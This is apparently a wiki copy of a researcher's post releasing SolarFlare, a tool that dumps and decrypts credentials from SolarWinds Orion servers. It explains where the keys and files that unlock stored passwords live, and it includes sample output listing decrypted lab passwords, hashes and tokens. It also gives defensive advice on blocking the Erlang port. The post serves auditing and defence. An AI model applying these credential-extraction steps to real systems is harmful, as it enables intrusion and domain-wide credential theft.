---
title: SolarWinds
description: 
published: true
date: 2021-01-17T20:12:12.130Z
tags: software, solarwinds, orion, decryption
editor: markdown
dateCreated: 2021-01-17T20:12:12.130Z
---

# SolarWinds

Source: https://malicious.link/post/2020/solarflare-release-password-dumper-for-solarwinds-orion/

## TL;DR

Here are the concerns I have regarding the SolarWinds/FireEye breach:
1. The accounts stored in an organization's SolarWinds Orion may be underestimated. I recently did a pentest for a firm that had over 200 credentials stored in their SolarWinds Orion database, but only 15 showed in the interface (the SolarWinds credential interface is complicated with sections for each connection type and different panes for each, it may also not properly delete credentials from the database when "removed" from the interface, I am unsure).
2. The re-infection possibilities, from one-time access to SolarWinds Orion database and file system, is being underestimated. Attackers can directly re-infect SolarWinds Orion systems through Erlang and other vulnerabilities. Rotating these credentials is HARD.
3. Not enough is being talked about on how to properly secure SolarWinds Orion machines.

I'm releasing this tool after a lot of thought surrounding the SolarWinds/FireEye breach. It's been in development since 2015. The reason I developed SolarFlare in the first place was to assist in my Red Team engagements. The main reason to release the tool publicly, right now, is so businesses can identify one facet of the possible severity of this breach, using a simple command-line tool they can run on their own SolarWinds Orion machines. SolarFlare can help identify the accounts that may have been compromised during this breach.

SolarWinds is not an easy application to quickly identify which credentials are stored in the database. SolarFlare parses all of the needed pieces, connects to the database, and decrypts (where possible) all of the account data stored in the database. I have seen everything from regular Active Directory accounts, to AWS/Azure/Meraki API keys, and Cisco enable passwords.

Now that I've mentioned their encryption, before we start going down this rabbit hole, I must say that SolarWinds did a **fantastic** job at doing as much cryptography as possible to ensure that credential theft is not trivial. They had even made more improvements since 2015 when I first started researching the product. However, at the end of the day, SolarWinds Orion needs to have the ability to use the credentials in clear text, so no matter how much encryption they add, it will only ever be obfuscation.

## History

In 2016 I gave two talks, one at BSidesPhilly and the other at KiwiCon2016, down in New Zealand. These talks focused on the credentials I was able to steal out of SolarWinds Orion. At this time, I did not release any tooling to exploit access to SolarWinds, but I did talk about how reversing the credentials could easily be done due to the use of an exportable self-generated RSA key.


### Video from BSidesPhily 2016

<iframe width="560" height="315" src="https://www.youtube.com/embed/VXUPyod6vqw" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

### KiwiCon 2016

<iframe src="//www.slideshare.net/slideshow/embed_code/key/FBkXrKZmGENvF4" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/mubix/kiwicon-2016-kicking-orions-assets" title="KiwiCon 2016 - Kicking Orion&#x27;s Assets" target="_blank">KiwiCon 2016 - Kicking Orion&#x27;s Assets</a> </strong> from <strong><a href="https://www.slideshare.net/mubix" target="_blank">Rob Fuller</a></strong> </div>

### Erlang

Fast forward to 2018, [I released a blog post](https://malicious.link/post/2018/erlang-arce/), again about SolarWinds, where I talked more about the severe effects of exploiting SolarWinds Orion. SolarWinds makes use of RabbitMQ, which uses Erlang (a distributed programming language). An attacker with file-level access to the SolarWinds machine, either through code execution, access to backup files, or just a poorly permissioned share, could steal the file `.erlang.cookie` from the ProgramData directory and have SYSTEM level code execution to this day.

Changing this "cookie" is non-trivial. There isn't a method in the SolarWinds Orion interface to do so. I have been successful with just shutting down all of the SolarWinds services, altering the string in the file, and starting the services back up, but I cannot guarantee this won't break things in more robust corporate installs. A more complete method of defense is to simply **Block port 25672/tcp inbound to your SolarWinds Orion box**. This is the port that can be remotely accessed for remote code execution if an attacker has stolen the `.erlang.cookie` file.

### HD Moore

A few months later, [HD Moore](https://twitter.com/hdm) released a [blog post on the Atredis blog](https://www.atredis.com/blog/2018/10/24/fun-with-the-solarwinds-orion-platform) talking about the password hashing in SolarWinds Orion as well as how to decrypt the password from the SolarWinds Orion database. He also released the [tools on Github to do so](https://github.com/atredispartners/solarwinds-orion-cryptography).

Also, the password cracking tools [Hashcat](https://github.com/hashcat/hashcat/issues/1736) and [John the Ripper](https://github.com/openwall/john/pull/3449) added cracking capabilities for SolarWinds Orion password hashes.

### NPM

In late 2018, early 2019, [VeraSprite](https://twitter.com/VerSprite) researchers released CVE-2019-8917. This vulnerability affected SolarWinds Orion 12.3 and the WCF protocol it incorporated for communications. [There was a blog post](https://versprite.com/blog/security-research/exploitation-of-remote-services/), and a short video demonstrating the vulnerability. This vulnerability resulted in remote code execution as SYSTEM on the SolarWinds machine but does require valid credentials for the SolarWinds Orion interface.

<iframe width="560" height="315" src="https://www.youtube.com/embed/IE8LBmwZBgE" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

### ActiveCyber

In February of 2019, [ActiveCyber](https://www.activecyber.us) identified a [local privilege escalation bug in SolarWinds (CVE-2019-9546)](https://www.activecyber.us/activelabs/solarwinds-local-privilege-escalation-cve-2019-9546). Any user on the SolarWinds box could write `handle.exe` to `C:\ProgramData\SolarWinds\Orion\RabbitMQ\` directory and have it executed as `SYSTEM` every 5 minutes.


### CPL3H

In July of 2019, CPLSEC/[CPL3H](https://twitter.com/cpl3h) put together [a blog post](https://ijustwannared.team/2019/07/13/badministration-solarwinds/) about adding modules to their ([DarknessCherry](https://twitter.com/DarknessCherry) & CPLSEC) tool [BADministrator](https://github.com/ThunderGunExpress/BADministration). These are the modules they released (directly ripped from the blog post):

- solarwinds-enum – Enumerates all Solarwinds clients
- solarwinds-listalerts – Lists Solarwinds alerts
- solarwinds-alertremove – Removes the malicious alert used in the syscmd module
- solarwinds-syscmd – Executes system commands on the NMS server
- BADministration_SWDump.exe – Standalone memory scraper which (hopefully) retrieves Solarwinds WMI credentials

The SWDump tool steals the WMI credentials (usually Domain Admin or at least admin on a lot of systems) from client machines that have the SolarWinds log collector service installed.

Teh SYSCmd utilizies importing alert configurations to execute commands directly on the SolarWinds system as SYSTEM. You do need to be an administrator level user to do so, but it does this via the SolarWinds web API, so even if you have all other ports blocked to attacker, if they can achieve SolarWinds admin credentials, they can still get code execution on the machine.



## Present Day

Today I am releasing SolarFlare. SolarFlare is a Authentication Audit / Password dumping tool originally designed for Red Team engagements, but can be used to audit the exposure SolarWinds Orion systems pose to an organization. Below I will walk through each section of the output from SolarFlare. There are no options or arguments.

### Erlang Cookie

This function simply reads the `.erlang.cookie` file from the `ProgramData` directory where it's stored. You can find this file at `%PROGRAMDATA%\SolarWinds\Orion\RabbitMQ\.erlang.cookie`. It is a randomized string created during installation. This string does not change as far as I have observed. This string is also stored in the database.
```
============================================
| Collecting RabbitMQ Erlang Cookie
|       Erlang Cookie: abcdefg12456789abcde
```

### RSA Key

The "SolarWinds-Orion" RSA key is stored in the SYSTEM/LocalMachine certificate store and is generated during install. This certificate is used as the PKI based encryption/decryption for credentials stored int the database. I do not know why this certificate is generated in a way that makes it exportable. But, it doesn't not need to be exportable for the decryption to be used. This certificate can be used along with the [Atradis tool on Github to decrypt credentials from the database, **offline**.](https://github.com/atredispartners/solarwinds-orion-cryptography)

```
============================================
| Collecting SolarWinds Certificate
|       SolarWinds Orion Certificate Found!
|       Subject Name: CN=SolarWinds-Orion
|       Thumbprint  : BE85C6C3AACA8840E166187B6AB8C6BA9DA8DE80
|       Password    : alcvabkajp4
|       Private Key : MIIKHwIBAzCCCd8GCSqGSIb3DQEHAaCCCdAEggn<snip>
```

### DAT file

The DAT file is a recent (2019/2018?) additional encryption that was added to SolarWinds Orion. The file is also located in the ProgramData directory: `%PROGRAMDATA%\SolarWinds\Keystorage\CryptoHelper\default.dat`. This file is encrypted with the SYSTEM/LocalMachien DPAPI master keys. Once decrypted, much like the exporting of the RSA private key, it can be used to decrypt the AES based encrypted accounts in the database, **offline**.

```
| Collecting Default.DAT file
|       Encrypted: 01000000D08C9DDF0115D<snip>
|       Decrypted: 5D3CE5B08C9201E636BCF<snip>
```

### SWNetPerfMon.DB

SolarWinds Orion stores it's credentials for the database in a file called `SWNetPerfMon.DB` which can be found in the installation directory (usually Program Files). The scary piece of this file is that no matter how many software updates, or migrations of the data happen (from SQL server to SQL server), it stores all of the previous credentials, databases, and server names of the previous setups in this file.

There is also a newer file called `SolarWindsDatabaseAccessCredential.json` that can be found in ProgramData again: `%PROGRAMDATA%\SolarWinds\CredentialStorage\SolarWindsDatabaseAccessCredential.json`. This file is where the username and password are sometimes stored for the database.

The credentials are encrypted with the SYSTEM/LocalMachine DPAPI master keys, this time with a static set of entropy: "20120309". I have never been able to find the significance of this date in regards to SolarWinds. If anyone knows, please let me know, I'm super curious.

```
============================================
| Collecting Database Credentials          |
|       Path to SWNetPerfMon.DB is: C:\Program Files (x86)\SolarWinds\Orion\SWNetPerfMon.DB
|       Connection String: Server=(local)\SOLARWINDS_ORION;Database=SolarWindsOrion;User ID=SolarWindsOrionDatabaseUser;Password=SUPERSECRETPASSWORDHERE
|       Number of database credentials found: 1
```

### Connecting to the Database

The code then attempts to automatically connect to the databases that it's found and find the most current SolarWinds database.

### Exporting the Key Table

I currently haven't put in enough time to identify what this table is used for, but it looks to me like it may be the private key for the RSA key, and the DAT file, encrypted in a different way. If this is the case, then you may not even need access to the SolarWinds Orion server itself, possibly you'd just need access to the database where SolarWinds stores it's data.

```
============================================
| DB - Exporting Key Table                 |
|       KeyID: 1
|       Encrypted Key: LmjknGhSXTC<snip>
|       Kind: Aes256
|       Purpose: master
|       Protection Type: 1
|       Protection Value: BE85C6C3AACA8<snip>
|       Protection Details: {}
------------------------------------------------
|       KeyID: 2
|       Encrypted Key: //pj6a4FaCyfv/Rgs<snip>
|       Kind: Aes256
|       Purpose: oldcryptohelper
|       Protection Type: 0
|       Protection Value: 1
|       Protection Details: {"IV":"oj3JCT7Cft<snip>"}
```

### Exporting the Accounts Table

The accounts table is used to store credentials used to access the SolarWinds interface. It has changed a lot since my initial research. There used to be a column called "Password" that stored a credential that looked like this: `11-417578424799297-9-6260697430795685763067724`. Many current installation still store this passwords in this manner, if it wasn't a clean install. This is simple encoding with long division.

If you are interested in the code you can see it here: https://github.com/mubix/solarflare/blob/b87da0b515d20964490dd922f3ef5bc17ed397f3/SolarFlare/Program.cs#L441

At the time of this writing there is [a pull request to add the newer version of password hashing](https://github.com/hashcat/hashcat/issues/2620) that SolarWinds uses to store credentials used to access SolarWinds.

**The major concern about SolarWinds Orion accounts is that it upper cases all account passwords**. This means that the key space to attempt to crack them is 26 characters smaller (without the lowercase characters). This means that even though SolarWinds uses PBDKF12, 1000 iterations of it, and SHA512 hashing, cracking the account passwords is exponentially easier and faster.

Admin and Guest are common across installs. The guest account used to be enabled by default, which would allow attackers to gain access to the interface. This is no longer the case. There are two new accounts `_system` which has it's password stored in the credential database, and `iprequest` which I believe is a result of the one of the features I installed on the VM. The `_system` account is enabled by default and is an administrator. Even though this account has a randomized password, it being stored in the database means I can decrypt it, instead of trying to crack it.

```
============================================
| DB - Exporting Accounts Table            |
|        Account: _system
|        Password Hash: qE9ClH<snip>
|        Password Salt: XgtO8XNWc/KiIdglGOnxvw==
|        Hashcat Mode 12501: $solarwinds$1$XgtO8XNWc/KiIdglGOnxvw==$qE9ClHDI<snip>
|        Account Enabled: Y
|        Allow Admin: Y
|        Last Login: 12/15/2020
--------------------------------------------
|        Account: Admin
|        Password Hash: IfAEwA7LXxOAH7ORCG0ZYeq<snip>
|        Password Salt: jNhn3i2XtHfY8y4EOmNdiQ==
|        Hashcat Mode 12501: $solarwinds$1$jNhn3i2XtHfY8y4EOmNdiQ==$IfAEwA7LXxOAH7ORCG0ZY<snip>
|        Account Enabled: Y
|        Allow Admin: Y
|        Last Login: 12/02/2020
--------------------------------------------
|        Account: Guest
|        Password Hash: Y/EMuOWMNfCd<snip>
|        Salt is NULL in DB so lowercase username is used: guest
|        Hashcat Mode 12500: $solarwinds$0$guest$Y/EMuOWMNfCd<snip>
|        Account Enabled: N
|        Allow Admin: N
|        Last Login: 12/30/1899
--------------------------------------------
|        Account: iprequest
|        Password Hash: 7zskGWFukuHuwQ<snip>
|        Salt is NULL in DB so lowercase username is used: iprequest
|        Hashcat Mode 12500: $solarwinds$0$iprequest$7zskGWFukuHuwQ<snip>
|        Account Enabled: Y
|        Allow Admin: N
|        Last Login: 01/01/1900
--------------------------------------------
```
Here is what an older account type looks like:
```
|        Account: SITTINGDUCK\uberolduser
|        Password: 11-417578424799297-9-6260697430795685763067724
|        Decoded Password: ASDQWE123
|        Hashcat Mode 21500: $solarwinds$0$admin$fF1lrlOXfxVz51Etjcs18XNK+Zt3keV2AllH9cYtGzdt5Yg2TtcsU84G9+5VVFMIUorR5eNJzX/1kmef6wZfrg==
|        Account Enabled: Y
|        Allow Admin: N
|        Last Login: 11/15/2015
|        Account SID: S-1-5-21-1000000000-2000000000-3000000000-50000
|        Group: SITTINGDUCK\Domain Admins
--------------------------------------------
```

### Exporting the Credentials Table

Finally the actual credential table. I've observed 4 different methods for storing credentials here:
1. Clear text (as is the case for SNMP community strings)
2. Encrypted with the RSA key (this is the older method, being phased out it appears)
3. Encrypted with AES using the `default.dat` file as the decryption key
4. Encrypted using [Microsoft's XML encryption/decryption method](https://www.nuget.org/packages/System.Security.Cryptography.Xml/).

SolarFlare recognizes all of them, and will attempt to decrypt them accordingly. This is where you will find AWS API keys, vCenter credentials, SNMPv3 credentials, Cisco router and switch passwords and enable passwords. This is where the scary bits are.

```
============================================
| DB - Exporting Credentials Table         |
------------------1--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: _system
|       Desc: Cortex Integration
|       Owner: CORE
|               Password: 9dM-5pH/&amp;Y(KU-v
|               Username: _system
------------------1--------------------------
------------------2--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: JobEngine
|       Desc: Job Engine router TCP endpoint credentials
|       Owner: JobEngine
|               Password: +fBByxJFsK+da6ZN2wKvLTKC/PWUzFlfIvvwtW/XqvA=
|               Username: KWPPhiYJmE8+fRF6qlkxulK2tf3t79TQOAk1ywBMVOI=
------------------2--------------------------
------------------3--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2
| Name: public
|       Desc:
|       Owner: Orion
|               Community: public
------------------3--------------------------
------------------4--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2
| Name: private
|       Desc:
|       Owner: Orion
|               Community: private
------------------4--------------------------
------------------5--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: Erlang cookie
|       Desc: Erlang clustering cookie
|       Owner: Erlang
|               Password: abcdefg12456789abcde
|               Username: ignored
------------------5--------------------------
------------------6--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: RabbitMQ user account
|       Desc: RabbitMQ user account for Message Bus
|       Owner: RabbitMQ
|               Password: LtVmCrzlTNyWmwxpxJMi
|               Username: orion
------------------6--------------------------
------------------7--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3
| Name: User: snmpv3user, Context: thisisthecontext
|       Desc:
|       Owner: Orion
|               AuthenticationKeyIsPassword: false
|               AuthenticationPassword: ASDqwe123
|               AuthenticationType: SHA1
|               Context: thisisthecontext
|               PrivacyKeyIsPassword: false
|               PrivacyPassword: ASDqwe123
|               PrivacyType: AES256
|               UserName: snmpv3user
------------------7--------------------------
------------------8--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3
| Name: User: rootsnmpv3, Context: newcontextv3
|       Desc:
|       Owner: Orion
|               AuthenticationKeyIsPassword: true
|               AuthenticationPassword: ASDqwe123
|               AuthenticationType: MD5
|               Context: newcontextv3
|               PrivacyKeyIsPassword: true
|               PrivacyPassword: ASDqwe123
|               PrivacyType: AES128
|               UserName: rootsnmpv3
------------------8--------------------------
------------------9--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: DomainAdmin
|       Desc:
|       Owner: Orion
|               Password: ASDqwe123
|               Username: SITTINGDUCK\uberuser
------------------9--------------------------
------------------10--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: DomainJoiner
|       Desc:
|       Owner: Orion
|               Password: ASDqwe123
|               Username: superadmin@sittingduck.info
------------------10--------------------------
------------------11--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: vesxi
|       Desc: vesxi
|       Owner: VIM
|               Password: ASDqwe123
|               Username: root
------------------11--------------------------
------------------12--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.ActiveDirectoryCredential
| Name: SITTINGDUCK\uberuser
| 	Desc:
| 	Owner: Orion
| 		Password: ASDqwe213
| 		Username: SITTINGDUCK\uberuser
------------------12--------------------------
------------------13--------------------------
| Type: SolarWinds.APM.Common.Credentials.ApmUsernamePasswordCredential
| Name: App Monitoring User
| 	Desc:
| 	Owner: APM
| 		Password: ASDqwe123
| 		Username: SITTINGDUCK\uberuser
------------------13--------------------------
------------------14--------------------------
| Type: SolarWinds.SRM.Common.Credentials.SmisCredentials
| Name: EMC_SMIS_Solarwinds
| 	Desc:
| 	Owner: SRM
| 		HttpPort: 5988
| 		HttpsPort: 5989
| 		InteropNamespace: /interop
| 		Namespace: root/emc
| 		Password: ASDqwe123
| 		Username: solarwinds
| 		UseSSL: true
------------------14--------------------------
------------------15--------------------------
| Type: SolarWinds.ESI.Common.Connection.ExternalSystemCredential
| Name: ESC
| 	Desc:
| 	Owner: ESI
| 		Password: ASDqwe123
| 		Username: solar_winds
------------------15--------------------------
------------------16--------------------------
| Type: SolarWinds.Orion.Web.Integration.OAuth2Token
| Name: SITTINGDUCK\uberuser
| 	Desc:
| 	Owner: Web.Integration
| 		AccessToken: GthQHd3<snip>
| 		AccessTokenExpiration: 2020-11-01T10:52:50.2768075Z
| 		AccessTokenIssueDate: 2020-11-01T09:52:51.2768075Z
| 		RefreshToken:hEyph9WqIfzm<snip>
| 		Scopes:
| 		Username: uberuser@sittingduck.info
------------------16--------------------------
------------------17--------------------------
| Type: SolarWinds.SRM.Common.Credentials.XtremIoHttpCredential
| Name: XtremIO_Admin
| 	Desc:
| 	Owner: SRM
| 		HttpPort: 80
| 		HttpsPort: 443
| 		Password: ASDqwe123
| 		Username: admin
| 		UseSsl: true
------------------18--------------------------
============================================
============================================
```

If you've made it this far, you can find the project over at https://github.com/mubix/solarflare.
Also, for defenders, I have added the creation of the file "SolarFlare" in `C:\Windows\Temp\` when you run SolarFlare. Hopefully that will help catch any pentesters or script kiddies that don't read code or compile for themselves.